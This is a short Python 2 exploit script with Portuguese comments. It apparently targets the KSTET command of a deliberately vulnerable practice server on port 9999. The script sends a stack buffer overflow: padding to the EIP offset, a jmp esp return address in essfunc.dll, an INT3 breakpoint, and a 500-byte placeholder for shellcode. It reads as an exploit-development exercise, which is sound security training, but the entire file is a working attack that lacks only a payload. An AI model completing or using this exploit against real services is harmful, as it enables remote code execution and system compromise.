#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from struct import *

host= "172.30.200.66"

port = 9999

payload  = "A" * 66                 # EIP Offset
payload += pack('<L',0x625011af)    # 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
payload += "\xCC"                   # Instrucao INT3 (Break)
payload += "C" * 500                # Espaco para shellcode

buffer  = b"KSTET /.:/"
buffer += payload

print "[*] Enviando requisicao maliciosa ... :)"

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))
exp.recv(4096)

exp.send(buffer)

exp.close()


